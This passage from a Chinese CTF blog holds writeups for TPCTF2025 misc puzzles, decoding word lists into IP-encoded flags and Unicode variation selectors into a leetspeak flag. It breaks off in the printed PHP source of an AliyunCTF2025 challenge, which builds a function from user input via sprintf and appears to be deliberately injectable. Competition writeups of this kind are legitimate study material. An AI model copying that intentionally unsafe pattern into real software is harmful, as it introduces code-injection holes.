class="string">&#x27;Gus&#x27;</span>, <span class="string">&#x27;Hoh&#x27;</span>, <span class="string">&#x27;Fix&#x27;</span>, <span class="string">&#x27;Cup&#x27;</span>, <span class="string">&#x27;Fer&#x27;</span>, <span class="string">&#x27;Deo&#x27;</span>, <span class="string">&#x27;Coy&#x27;</span>, <span class="string">&#x27;Jer&#x27;</span>, <span class="string">&#x27;Luc&#x27;</span>, <span class="string">&#x27;Gif&#x27;</span>, <span class="string">&#x27;Cou&#x27;</span>, <span class="string">&#x27;Dob&#x27;</span>, <span class="string">&#x27;Dow&#x27;</span>, <span class="string">&#x27;Hum&#x27;</span>, <span class="string">&#x27;Hom&#x27;</span>, <span class="string">&#x27;Nan&#x27;</span>, <span class="string">&#x27;Dot&#x27;</span>, <span class="string">&#x27;Den&#x27;</span>, <span class="string">&#x27;Yeh&#x27;</span>, <span class="string">&#x27;Ces&#x27;</span>, <span class="string">&#x27;Jak&#x27;</span>, <span class="string">&#x27;Nei&#x27;</span>, <span class="string">&#x27;Rag&#x27;</span>, <span class="string">&#x27;Dar&#x27;</span>, <span class="string">&#x27;Pun&#x27;</span>, <span class="string">&#x27;Dex&#x27;</span>, <span class="string">&#x27;Gee&#x27;</span>, <span class="string">&#x27;Nes&#x27;</span>, <span class="string">&#x27;Mit&#x27;</span>, <span class="string">&#x27;Fos&#x27;</span>, <span class="string">&#x27;Sed&#x27;</span>, <span class="string">&#x27;Pac&#x27;</span>, <span class="string">&#x27;Cic&#x27;</span>, <span class="string">&#x27;Toi&#x27;</span>, <span class="string">&#x27;Raz&#x27;</span>, <span class="string">&#x27;Tok&#x27;</span>, <span class="string">&#x27;Did&#x27;</span>, <span class="string">&#x27;Rik&#x27;</span>, <span class="string">&#x27;Hit&#x27;</span>, <span class="string">&#x27;Kam&#x27;</span>, <span class="string">&#x27;Hiv&#x27;</span>, <span class="string">&#x27;Jut&#x27;</span>, <span class="string">&#x27;Tee&#x27;</span>, <span class="string">&#x27;Pod&#x27;</span>, <span class="string">&#x27;Gir&#x27;</span>, <span class="string">&#x27;Sax&#x27;</span>, <span class="string">&#x27;Hat&#x27;</span>, <span class="string">&#x27;Dab&#x27;</span>, <span class="string">&#x27;Nai&#x27;</span>, <span class="string">&#x27;Jez&#x27;</span>, <span class="string">&#x27;Was&#x27;</span>, <span class="string">&#x27;Bon&#x27;</span>, <span class="string">&#x27;Kid&#x27;</span>, <span class="string">&#x27;Him&#x27;</span>, <span class="string">&#x27;Tia&#x27;</span>, <span class="string">&#x27;Bin&#x27;</span>, <span class="string">&#x27;Wep&#x27;</span>, <span class="string">&#x27;Dup&#x27;</span>, <span class="string">&#x27;Yue&#x27;</span>, <span class="string">&#x27;Maa&#x27;</span>, <span class="string">&#x27;Hao&#x27;</span>, <span class="string">&#x27;Suv&#x27;</span>, <span class="string">&#x27;Ken&#x27;</span>, <span class="string">&#x27;Mod&#x27;</span>, <span class="string">&#x27;Kan&#x27;</span>, <span class="string">&#x27;Moc&#x27;</span>, <span class="string">&#x27;Cow&#x27;</span>, <span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Ben&#x27;</span>, <span class="string">&#x27;Deg&#x27;</span>, <span class="string">&#x27;Gaf&#x27;</span>, <span class="string">&#x27;Yaw&#x27;</span>, <span class="string">&#x27;Luk&#x27;</span>, <span class="string">&#x27;Faa&#x27;</span>, <span class="string">&#x27;Bow&#x27;</span>, <span class="string">&#x27;Ror&#x27;</span>, <span class="string">&#x27;Bee&#x27;</span>, <span class="string">&#x27;Cob&#x27;</span>, <span class="string">&#x27;Loy&#x27;</span>, <span class="string">&#x27;Row&#x27;</span>, <span class="string">&#x27;Det&#x27;</span>, <span class="string">&#x27;Nut&#x27;</span>, <span class="string">&#x27;Rah&#x27;</span>, <span class="string">&#x27;Coi&#x27;</span>, <span class="string">&#x27;Rap&#x27;</span>, <span class="string">&#x27;Def&#x27;</span>, <span class="string">&#x27;Hie&#x27;</span>, <span class="string">&#x27;Tic&#x27;</span>, <span class="string">&#x27;Wis&#x27;</span>, <span class="string">&#x27;Mew&#x27;</span>, <span class="string">&#x27;Dav&#x27;</span>, <span class="string">&#x27;Sir&#x27;</span>, <span class="string">&#x27;Zoe&#x27;</span>, <span class="string">&#x27;Zin&#x27;</span>, <span class="string">&#x27;Uac&#x27;</span>, <span class="string">&#x27;Rab&#x27;</span>, <span class="string">&#x27;Yen&#x27;</span>, <span class="string">&#x27;Sip&#x27;</span>, <span class="string">&#x27;Nip&#x27;</span>, <span class="string">&#x27;Bir&#x27;</span>, <span class="string">&#x27;Pak&#x27;</span>, <span class="string">&#x27;Kar&#x27;</span>, <span class="string">&#x27;Gen&#x27;</span>, <span class="string">&#x27;Kea&#x27;</span>, <span class="string">&#x27;Sor&#x27;</span>, <span class="string">&#x27;Lod&#x27;</span>, <span class="string">&#x27;Fas&#x27;</span>, <span class="string">&#x27;Sif&#x27;</span>, <span class="string">&#x27;Zag&#x27;</span>, <span class="string">&#x27;Rea&#x27;</span>, <span class="string">&#x27;Wed&#x27;</span>, <span class="string">&#x27;Vex&#x27;</span>, <span class="string">&#x27;Lem&#x27;</span>, <span class="string">&#x27;Sob&#x27;</span>, <span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Lar&#x27;</span>, <span class="string">&#x27;Rav&#x27;</span>, <span class="string">&#x27;Sou&#x27;</span>, <span class="string">&#x27;Bev&#x27;</span>, <span class="string">&#x27;Kek&#x27;</span>, <span class="string">&#x27;Kol&#x27;</span>, <span class="string">&#x27;Rae&#x27;</span>, <span class="string">&#x27;Map&#x27;</span>, <span class="string">&#x27;Dah&#x27;</span>, <span class="string">&#x27;Pee&#x27;</span>, <span class="string">&#x27;Tam&#x27;</span>, <span class="string">&#x27;Loc&#x27;</span>, <span class="string">&#x27;Boc&#x27;</span>, <span class="string">&#x27;Coz&#x27;</span>, <span class="string">&#x27;Ful&#x27;</span>, <span class="string">&#x27;Paz&#x27;</span>, <span class="string">&#x27;Hop&#x27;</span>, <span class="string">&#x27;Bui&#x27;</span>, <span class="string">&#x27;Ref&#x27;</span>, <span class="string">&#x27;Coo&#x27;</span>, <span class="string">&#x27;Rez&#x27;</span>, <span class="string">&#x27;Seq&#x27;</span>, <span class="string">&#x27;Lou&#x27;</span>, <span class="string">&#x27;Hon&#x27;</span>, <span class="string">&#x27;Leo&#x27;</span>, <span class="string">&#x27;Bis&#x27;</span>, <span class="string">&#x27;Dia&#x27;</span>, <span class="string">&#x27;Hui&#x27;</span>, <span class="string">&#x27;Mai&#x27;</span>, <span class="string">&#x27;Pez&#x27;</span>, <span class="string">&#x27;Boy&#x27;</span>, <span class="string">&#x27;Rog&#x27;</span>, <span class="string">&#x27;Dac&#x27;</span>, <span class="string">&#x27;Tut&#x27;</span>, <span class="string">&#x27;Rut&#x27;</span>, <span class="string">&#x27;Cuz&#x27;</span>, <span class="string">&#x27;Now&#x27;</span>, <span class="string">&#x27;Nii&#x27;</span>, <span class="string">&#x27;Yas&#x27;</span>, <span class="string">&#x27;Doj&#x27;</span>, <span class="string">&#x27;Saw&#x27;</span>, <span class="string">&#x27;Bex&#x27;</span>, <span class="string">&#x27;Fom&#x27;</span>]</span><br><span class="line">fourth=[<span class="string">&#x27;Puc&#x27;</span>, <span class="string">&#x27;Maz&#x27;</span>, <span class="string">&#x27;Doh&#x27;</span>, <span class="string">&#x27;Hun&#x27;</span>, <span class="string">&#x27;Cud&#x27;</span>, <span class="string">&#x27;Vit&#x27;</span>, <span class="string">&#x27;Wer&#x27;</span>, <span class="string">&#x27;Hag&#x27;</span>, <span class="string">&#x27;Din&#x27;</span>, <span class="string">&#x27;Feb&#x27;</span>, <span class="string">&#x27;Gui&#x27;</span>, <span class="string">&#x27;Rak&#x27;</span>, <span class="string">&#x27;Vac&#x27;</span>, <span class="string">&#x27;Kim&#x27;</span>, <span class="string">&#x27;Pol&#x27;</span>, <span class="string">&#x27;Som&#x27;</span>, <span class="string">&#x27;Saa&#x27;</span>, <span class="string">&#x27;Hac&#x27;</span>, <span class="string">&#x27;Xie&#x27;</span>, <span class="string">&#x27;Ses&#x27;</span>, <span class="string">&#x27;Van&#x27;</span>, <span class="string">&#x27;Nef&#x27;</span>, <span class="string">&#x27;Mia&#x27;</span>, <span class="string">&#x27;Tab&#x27;</span>, <span class="string">&#x27;Pid&#x27;</span>, <span class="string">&#x27;Ver&#x27;</span>, <span class="string">&#x27;Cay&#x27;</span>, <span class="string">&#x27;Jog&#x27;</span>, <span class="string">&#x27;Jar&#x27;</span>, <span class="string">&#x27;Lan&#x27;</span>, <span class="string">&#x27;Hex&#x27;</span>, <span class="string">&#x27;Soe&#x27;</span>, <span class="string">&#x27;Lid&#x27;</span>, <span class="string">&#x27;Fip&#x27;</span>, <span class="string">&#x27;Wet&#x27;</span>, <span class="string">&#x27;Ner&#x27;</span>, <span class="string">&#x27;Dey&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Dua&#x27;</span>, <span class="string">&#x27;Dez&#x27;</span>, <span class="string">&#x27;Gut&#x27;</span>, <span class="string">&#x27;Sag&#x27;</span>, <span class="string">&#x27;Kor&#x27;</span>, <span class="string">&#x27;Yon&#x27;</span>, <span class="string">&#x27;Haa&#x27;</span>, <span class="string">&#x27;Par&#x27;</span>, <span class="string">&#x27;Fat&#x27;</span>, <span class="string">&#x27;Vel&#x27;</span>, <span class="string">&#x27;Yum&#x27;</span>, <span class="string">&#x27;Wac&#x27;</span>, <span class="string">&#x27;Poe&#x27;</span>, <span class="string">&#x27;Yes&#x27;</span>, <span class="string">&#x27;Rex&#x27;</span>, <span class="string">&#x27;Gop&#x27;</span>, <span class="string">&#x27;Cit&#x27;</span>, <span class="string">&#x27;Val&#x27;</span>, <span class="string">&#x27;Xix&#x27;</span>, <span class="string">&#x27;Bit&#x27;</span>, <span class="string">&#x27;Mig&#x27;</span>, <span class="string">&#x27;Mib&#x27;</span>, <span class="string">&#x27;Gaa&#x27;</span>, <span class="string">&#x27;Sat&#x27;</span>, <span class="string">&#x27;Mex&#x27;</span>, <span class="string">&#x27;Geo&#x27;</span>, <span class="string">&#x27;Doi&#x27;</span>, <span class="string">&#x27;Mou&#x27;</span>, <span class="string">&#x27;Dol&#x27;</span>, <span class="string">&#x27;Joy&#x27;</span>, <span class="string">&#x27;Caa&#x27;</span>, <span class="string">&#x27;Dix&#x27;</span>, <span class="string">&#x27;Nat&#x27;</span>, <span class="string">&#x27;Boj&#x27;</span>, <span class="string">&#x27;Mad&#x27;</span>, <span class="string">&#x27;Pew&#x27;</span>, <span class="string">&#x27;Nev&#x27;</span>, <span class="string">&#x27;Sas&#x27;</span>, <span class="string">&#x27;Rin&#x27;</span>, <span class="string">&#x27;Dal&#x27;</span>, <span class="string">&#x27;Joo&#x27;</span>, <span class="string">&#x27;Vii&#x27;</span>, <span class="string">&#x27;Tid&#x27;</span>, <span class="string">&#x27;Hap&#x27;</span>, <span class="string">&#x27;Sea&#x27;</span>, <span class="string">&#x27;Cae&#x27;</span>, <span class="string">&#x27;Cab&#x27;</span>, <span class="string">&#x27;Nea&#x27;</span>, <span class="string">&#x27;Wan&#x27;</span>, <span class="string">&#x27;Mem&#x27;</span>, <span class="string">&#x27;Nam&#x27;</span>, <span class="string">&#x27;Mao&#x27;</span>, <span class="string">&#x27;Pov&#x27;</span>, <span class="string">&#x27;Pio&#x27;</span>, <span class="string">&#x27;Bey&#x27;</span>, <span class="string">&#x27;Vas&#x27;</span>, <span class="string">&#x27;Jee&#x27;</span>, <span class="string">&#x27;Not&#x27;</span>, <span class="string">&#x27;Lat&#x27;</span>, <span class="string">&#x27;Sud&#x27;</span>, <span class="string">&#x27;Bog&#x27;</span>, <span class="string">&#x27;Hue&#x27;</span>, <span class="string">&#x27;Rio&#x27;</span>, <span class="string">&#x27;Got&#x27;</span>, <span class="string">&#x27;Liu&#x27;</span>, <span class="string">&#x27;Lax&#x27;</span>, <span class="string">&#x27;Fec&#x27;</span>, <span class="string">&#x27;Duc&#x27;</span>, <span class="string">&#x27;Rec&#x27;</span>, <span class="string">&#x27;Mas&#x27;</span>, <span class="string">&#x27;Cig&#x27;</span>, <span class="string">&#x27;Vox&#x27;</span>, <span class="string">&#x27;Rov&#x27;</span>, <span class="string">&#x27;Pow&#x27;</span>, <span class="string">&#x27;Sil&#x27;</span>, <span class="string">&#x27;Gac&#x27;</span>, <span class="string">&#x27;Pet&#x27;</span>, <span class="string">&#x27;Yay&#x27;</span>, <span class="string">&#x27;Sad&#x27;</span>, <span class="string">&#x27;Ram&#x27;</span>, <span class="string">&#x27;Box&#x27;</span>, <span class="string">&#x27;Wag&#x27;</span>, <span class="string">&#x27;Nin&#x27;</span>, <span class="string">&#x27;Lib&#x27;</span>, <span class="string">&#x27;Tou&#x27;</span>, <span class="string">&#x27;Dae&#x27;</span>, <span class="string">&#x27;Tau&#x27;</span>, <span class="string">&#x27;Teo&#x27;</span>, <span class="string">&#x27;Sod&#x27;</span>, <span class="string">&#x27;Hoy&#x27;</span>, <span class="string">&#x27;Tip&#x27;</span>, <span class="string">&#x27;Cer&#x27;</span>, <span class="string">&#x27;Wee&#x27;</span>, <span class="string">&#x27;Nov&#x27;</span>, <span class="string">&#x27;Keg&#x27;</span>, <span class="string">&#x27;Nit&#x27;</span>, <span class="string">&#x27;Wok&#x27;</span>, <span class="string">&#x27;Hin&#x27;</span>, <span class="string">&#x27;Tue&#x27;</span>, <span class="string">&#x27;Ron&#x27;</span>, <span class="string">&#x27;Roi&#x27;</span>, <span class="string">&#x27;Vos&#x27;</span>, <span class="string">&#x27;Sao&#x27;</span>, <span class="string">&#x27;Kia&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;Mip&#x27;</span>, <span class="string">&#x27;Cub&#x27;</span>, <span class="string">&#x27;Nah&#x27;</span>, <span class="string">&#x27;Hot&#x27;</span>, <span class="string">&#x27;Wic&#x27;</span>, <span class="string">&#x27;Yar&#x27;</span>, <span class="string">&#x27;Sic&#x27;</span>, <span class="string">&#x27;Sar&#x27;</span>, <span class="string">&#x27;Kok&#x27;</span>, <span class="string">&#x27;Fee&#x27;</span>, <span class="string">&#x27;Yuk&#x27;</span>, <span class="string">&#x27;Hoo&#x27;</span>, <span class="string">&#x27;Hei&#x27;</span>, <span class="string">&#x27;Dap&#x27;</span>, <span class="string">&#x27;Cen&#x27;</span>, <span class="string">&#x27;Las&#x27;</span>, <span class="string">&#x27;Guy&#x27;</span>, <span class="string">&#x27;Jon&#x27;</span>, <span class="string">&#x27;His&#x27;</span>, <span class="string">&#x27;Moo&#x27;</span>, <span class="string">&#x27;Roz&#x27;</span>, <span class="string">&#x27;Fac&#x27;</span>, <span class="string">&#x27;Fir&#x27;</span>, <span class="string">&#x27;Ham&#x27;</span>, <span class="string">&#x27;Rad&#x27;</span>, <span class="string">&#x27;Foi&#x27;</span>, <span class="string">&#x27;Sof&#x27;</span>, <span class="string">&#x27;Poo&#x27;</span>, <span class="string">&#x27;Toa&#x27;</span>, <span class="string">&#x27;Kos&#x27;</span>, <span class="string">&#x27;Sei&#x27;</span>, <span class="string">&#x27;Dof&#x27;</span>, <span class="string">&#x27;Get&#x27;</span>, <span class="string">&#x27;Bap&#x27;</span>, <span class="string">&#x27;Kes&#x27;</span>, <span class="string">&#x27;Die&#x27;</span>, <span class="string">&#x27;Dad&#x27;</span>, <span class="string">&#x27;Pea&#x27;</span>, <span class="string">&#x27;Nus&#x27;</span>, <span class="string">&#x27;Tit&#x27;</span>, <span class="string">&#x27;Ros&#x27;</span>, <span class="string">&#x27;Nay&#x27;</span>, <span class="string">&#x27;Moa&#x27;</span>, <span class="string">&#x27;Zen&#x27;</span>, <span class="string">&#x27;Mam&#x27;</span>, <span class="string">&#x27;Heb&#x27;</span>, <span class="string">&#x27;Fab&#x27;</span>, <span class="string">&#x27;Rib&#x27;</span>, <span class="string">&#x27;Cao&#x27;</span>, <span class="string">&#x27;Hey&#x27;</span>, <span class="string">&#x27;Wot&#x27;</span>, <span class="string">&#x27;Soo&#x27;</span>, <span class="string">&#x27;Kai&#x27;</span>, <span class="string">&#x27;Cem&#x27;</span>, <span class="string">&#x27;Rom&#x27;</span>, <span class="string">&#x27;Uaw&#x27;</span>, <span class="string">&#x27;Zed&#x27;</span>, <span class="string">&#x27;Noi&#x27;</span>, <span class="string">&#x27;Sab&#x27;</span>, <span class="string">&#x27;Tes&#x27;</span>, <span class="string">&#x27;Gob&#x27;</span>, <span class="string">&#x27;Jax&#x27;</span>, <span class="string">&#x27;Nob&#x27;</span>, <span class="string">&#x27;Bao&#x27;</span>, <span class="string">&#x27;Tos&#x27;</span>, <span class="string">&#x27;Tor&#x27;</span>, <span class="string">&#x27;Mep&#x27;</span>, <span class="string">&#x27;Pan&#x27;</span>, <span class="string">&#x27;Har&#x27;</span>, <span class="string">&#x27;Guv&#x27;</span>, <span class="string">&#x27;Foa&#x27;</span>, <span class="string">&#x27;Nih&#x27;</span>, <span class="string">&#x27;Cim&#x27;</span>, <span class="string">&#x27;Pig&#x27;</span>, <span class="string">&#x27;Jot&#x27;</span>, <span class="string">&#x27;Sop&#x27;</span>, <span class="string">&#x27;Duh&#x27;</span>, <span class="string">&#x27;Jia&#x27;</span>, <span class="string">&#x27;Nil&#x27;</span>, <span class="string">&#x27;Fib&#x27;</span>, <span class="string">&#x27;Kei&#x27;</span>, <span class="string">&#x27;Gad&#x27;</span>, <span class="string">&#x27;Toy&#x27;</span>, <span class="string">&#x27;Pim&#x27;</span>, <span class="string">&#x27;Gel&#x27;</span>, <span class="string">&#x27;Cet&#x27;</span>, <span class="string">&#x27;Hal&#x27;</span>, <span class="string">&#x27;Wen&#x27;</span>, <span class="string">&#x27;Yah&#x27;</span>, <span class="string">&#x27;Nup&#x27;</span>, <span class="string">&#x27;Jai&#x27;</span>, <span class="string">&#x27;Paw&#x27;</span>, <span class="string">&#x27;Pos&#x27;</span>, <span class="string">&#x27;Qed&#x27;</span>, <span class="string">&#x27;Tel&#x27;</span>, <span class="string">&#x27;Gay&#x27;</span>, <span class="string">&#x27;Liv&#x27;</span>, <span class="string">&#x27;Bus&#x27;</span>, <span class="string">&#x27;Fop&#x27;</span>, <span class="string">&#x27;Pia&#x27;</span>, <span class="string">&#x27;Miu&#x27;</span>, <span class="string">&#x27;Ked&#x27;</span>, <span class="string">&#x27;Fea&#x27;</span>, <span class="string">&#x27;Fob&#x27;</span>, <span class="string">&#x27;Sel&#x27;</span>, <span class="string">&#x27;Miz&#x27;</span>, <span class="string">&#x27;Lor&#x27;</span>, <span class="string">&#x27;Tay&#x27;</span>, <span class="string">&#x27;Pot&#x27;</span>, <span class="string">&#x27;Tac&#x27;</span>, <span class="string">&#x27;Wei&#x27;</span>, <span class="string">&#x27;Mug&#x27;</span>, <span class="string">&#x27;Dat&#x27;</span>, <span class="string">&#x27;Wal&#x27;</span>, <span class="string">&#x27;How&#x27;</span>, <span class="string">&#x27;Yow&#x27;</span>, <span class="string">&#x27;Pax&#x27;</span>]</span><br><span class="line">target=[<span class="string">&#x27;VicCouNeaGas&#x27;</span>, <span class="string">&#x27;DemHohBojWod&#x27;</span>, <span class="string">&#x27;PowFitGuoRut&#x27;</span>, <span class="string">&#x27;VetTasBesDae&#x27;</span>, <span class="string">&#x27;FasLiuTasJoi&#x27;</span>, <span class="string">&#x27;DevRecWoeDia&#x27;</span>, <span class="string">&#x27;BogHubSorHad&#x27;</span>, <span class="string">&#x27;BagLibYupSix&#x27;</span>, <span class="string">&#x27;MowPetBecZan&#x27;</span>, <span class="string">&#x27;LonRecRipLuk&#x27;</span>, <span class="string">&#x27;KarYapTajGot&#x27;</span>, <span class="string">&#x27;TiaLiuFayDic&#x27;</span>, <span class="string">&#x27;VizDivCitBot&#x27;</span>, <span class="string">&#x27;LeaLatReaSac&#x27;</span>, <span class="string">&#x27;FasLiuVicToc&#x27;</span>, <span class="string">&#x27;KunSadMerMun&#x27;</span>, <span class="string">&#x27;LemLiuGuoReq&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">s</span>):</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    ls=[s[<span class="number">0</span>:<span class="number">3</span>],s[<span class="number">3</span>:<span class="number">6</span>],s[<span class="number">6</span>:<span class="number">9</span>],s[<span class="number">9</span>:<span class="number">12</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fourth:</span><br><span class="line">            index+=fourth.index(i)*<span class="number">103</span>*<span class="number">513</span>*<span class="number">313</span></span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> third:</span><br><span class="line">            index+=third.index(i)*<span class="number">103</span>*<span class="number">513</span></span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> second:</span><br><span class="line">            index+=second.index(i)*<span class="number">103</span></span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> first:</span><br><span class="line">            index+=first.index(i)</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    ans.append(<span class="built_in">str</span>(ipaddress.IPv4Address(process(i))))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment">#[&#x27;84.80.67.84&#x27;, &#x27;70.123.102.105&#x27;, &#x27;110.97.108.108&#x27;, &#x27;121.95.116.104&#x27;, &#x27;101.95.99.114&#x27;, &#x27;105.109.105.110&#x27;, &#x27;97.108.53.95&#x27;, &#x27;119.104.48.95&#x27;, &#x27;112.117.98.108&#x27;, &#x27;105.53.104.101&#x27;, &#x27;100.95.116.104&#x27;, &#x27;101.53.101.95&#x27;, &#x27;53.112.97.109&#x27;, &#x27;95.119.101.114&#x27;, &#x27;101.95.97.114&#x27;, &#x27;114.101.53.116&#x27;, &#x27;101.100.125.32&#x27;]</span></span><br></pre></td></tr></table></figure><p>不难发现这些数字都在ascii的可打印字符范围内</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250310100935051.png"alt="image-20250310100935051" /><figcaption aria-hidden="true">image-20250310100935051</figcaption></figure><h2 id="复现">复现</h2><h3 id="crypto">Crypto</h3><h4 id="nanonymous-msg">nanonymous msg</h4><blockquote><p>看似是密码，实则是纯misc。。。</p><p>瞪着那些数据看了一天没做出来，还是太菜了(T0T)幸亏队伍里的密码师傅和misc师傅超强，最终出了，又是被带飞的一集Orz</p></blockquote><p>题目就这点东西</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250310103021529.png"alt="image-20250310103021529" /><figcaption aria-hidden="true">image-20250310103021529</figcaption></figure><p>不难发现这串字前面有一些不可见字符</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250310103126223.png"alt="image-20250310103126223" /><figcaption aria-hidden="true">image-20250310103126223</figcaption></figure><p>可以查到这都是unicode变体选择器在<ahref="https://www.utf8-chartable.de/unicode-utf8-table.pl?start=917760">这个网站</a>上可以找到这些选择器分别对应哪个平面</p><p>用脚本提取后两个十六进制位+17就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ls=[(<span class="built_in">ord</span>(x) &amp; <span class="number">0xff</span>)+<span class="number">17</span> <span class="keyword">for</span> x <span class="keyword">in</span> s <span class="keyword">if</span> <span class="built_in">ord</span>(x) &gt;= <span class="number">0x7f</span>]</span><br><span class="line"><span class="built_in">print</span>(ls)</span><br></pre></td></tr></table></figure><blockquote><p>然后后面就是我想不到的了(</p></blockquote><p>由于236出现的最多，所以猜测236对应下划线，先直接去掉，另外再去掉flag头尾，将剩下的数字意义映射成字母。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ls=[(<span class="built_in">ord</span>(x) &amp; <span class="number">0xff</span>)+<span class="number">17</span> <span class="keyword">for</span> x <span class="keyword">in</span> s <span class="keyword">if</span> <span class="built_in">ord</span>(x) &gt;= <span class="number">0x7f</span>]</span><br><span class="line">data=ls[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line">dict1 = &#123;&#125;</span><br><span class="line">cs = data</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cs:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> dict1:</span><br><span class="line">        dict1[i] = <span class="built_in">chr</span>(<span class="built_in">len</span>(dict1) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(dict1)</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cs:</span><br><span class="line">    tmp += dict1[i]</span><br><span class="line"><span class="built_in">print</span>(tmp.replace(dict1[<span class="number">236</span>], <span class="string">&#x27; &#x27;</span>)) </span><br><span class="line"><span class="comment">#abcde ghi jklmjbc in aocll epc qrda sbjecom hq bhoecb kjj qbht ucqvhk veq whww xodrl</span></span><br></pre></td></tr></table></figure><p>拿去quipquip爆破</p><figure><imgsrc="/images/TPCTF2025-misc-writeup-复现/image-20250310105207736.png"alt="image-20250310105207736" /><figcaption aria-hidden="true">image-20250310105207736</figcaption></figure><p>已经可以看到可读的flag了，但是还得改改。通过搜索可以找到<ahref="https://ptr-yudai.hatenablog.com/entry/2022/06/02/223338">这篇文章</a></p><p>因此可以先得到初版flag</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPCTF&#123;great_job_inspire_by_guess_the_flag_writeup_of_router_nii_from_defcon_ctf_2022_quals&#125;</span><br></pre></td></tr></table></figure><p>由于defcon那道题是说出题人喜欢用小写，并且会将o替换为0，所以现在我们的flag是这样</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPCTF&#123;great_j0b_inspire_by_guess_the_flag_writeup_0f_r0uter_nii_fr0m_defc0n_ctf_2022_quals&#125;</span><br></pre></td></tr></table></figure><p>还是不对，最终发现还需要将s替换成5</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPCTF&#123;great_j0b_in5pire_by_gue55_the_flag_writeup_0f_r0uter_nii_fr0m_defc0n_ctf_2022_qual5&#125;</span><br></pre></td></tr></table></figure><blockquote><p>太脑洞了，这我瞪到TPCTF2026都想不到。。。</p><p>师傅们还是tql OrzOrzOrz</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> TPCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aliyunctf2025 misc writeup+复现</title>
      <link href="/posts/3cb13075/"/>
      <url>/posts/3cb13075/</url>
      
        <content type="html"><![CDATA[<h2 id="writeup">Writeup</h2><p><ahref="https://www.blog.st4rr.top/writeups/AliyunCTF2025Writeup.pdf">Wrtieup点我</a></p><h2 id="复现">复现</h2><h3 id="misc">Misc</h3><h4 id="哈基游">哈基游</h4><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func_template</span> = <span class="string">&#x27;function check($file_hash, %s) &#123; if ($file_hash !== &quot;5baf19ce6561538119dfe32d561d6ab8509703606f768fea72723a01ee4264b7&quot;) &#123; echo &quot;%s not cached&quot;; &#125; &#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$cached_key</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;$f_0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_\$]&#123;1,5&#125;$/&#x27;</span>, <span class="variable">$cached_key</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid cached key&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">sprintf</span>(<span 